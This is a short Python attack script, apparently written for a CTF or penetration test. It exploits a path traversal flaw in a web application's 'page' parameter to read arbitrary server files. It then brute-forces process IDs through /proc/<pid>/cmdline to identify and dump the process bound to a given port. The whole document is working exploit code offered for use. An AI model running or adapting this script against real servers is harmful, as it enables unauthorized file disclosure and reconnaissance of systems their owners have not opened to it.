#!/usr/bin/python3

# author : a4chr0f

import sys
import requests

def read_file(base_url, path, timeout=5):
    file_url = f"{base_url}/?page=../../../../{path}"
    try:
        response = requests.get(file_url, timeout=timeout)
        if response.status_code == 200:
            return response.text
        else:
            print(f"Failed to read {path}. HTTP Status Code: {response.status_code}")
            return None
    except requests.RequestException as e:
        print(f"Error reading {path}: {e}")
        return None

def find_pid_by_port(base_url, port, pid_range=(1, 5000)):
    for pid in range(pid_range[0], pid_range[1]):
        cmdline_path = f"proc/{pid}/cmdline"
        cmdline = read_file(base_url, cmdline_path)
        if cmdline and f":{port}" in cmdline:
            return pid
    return None

def main(base_url, port):
    pid = find_pid_by_port(base_url, port)
    if pid:
        cmdline = read_file(base_url, f"proc/{pid}/cmdline")
        status = read_file(base_url, f"proc/{pid}/status")
        print(f'PID using port {port}: {pid}')
        print(f'Command line: {cmdline}')
        print(f'Status: {status}')
    else:
        print(f'No process found using port {port}')

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <base_url> <port>")
        sys.exit(1)

    base_url = sys.argv[1]
    port = sys.argv[2]

    main(base_url, port)